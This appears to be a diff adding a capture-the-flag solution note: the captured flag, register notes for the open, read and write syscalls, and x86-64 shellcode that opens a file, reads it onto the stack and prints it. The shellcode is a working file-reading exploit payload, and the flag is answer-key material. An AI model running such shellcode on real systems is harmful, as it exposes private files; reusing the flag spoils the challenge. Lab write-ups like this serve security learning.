@@ -1,0 +1,38 @@
+FLAG: flag{sometimes_you_do_not_need_a_shell_!}
+
+OPEN FILE:
+RDI: file path
+RSI: opening mode (O_RDONLY = 0)
+RAX: open syscall value
+
+READ FILE
+RDI: fd file (written by open in RAX)
+la SUB creates a stack frame in which the READ will store the read char
+RSI: buffer address
+RDX: buffer size
+RAX: read syscall value
+
+WRITE FILE
+RDI: fd file
+RSI: buffer address
+RDX: buffer size (value read in RAX = number of char read by the READ)
+RAX: write syscall value
+
+ENCODED in file "exploit"
+
+mov rdi,rax
+add rdi,68
+mov rsi,0
+mov rax,02
+syscall
+mov rdi,rax
+sub rsp,60
+mov rsi,rsp
+mov rdx,60
+mov rax,0
+syscall
+mov rdi,1
+mov rsi,rsp
+mov rdx,rax
+mov rax,1
+syscall
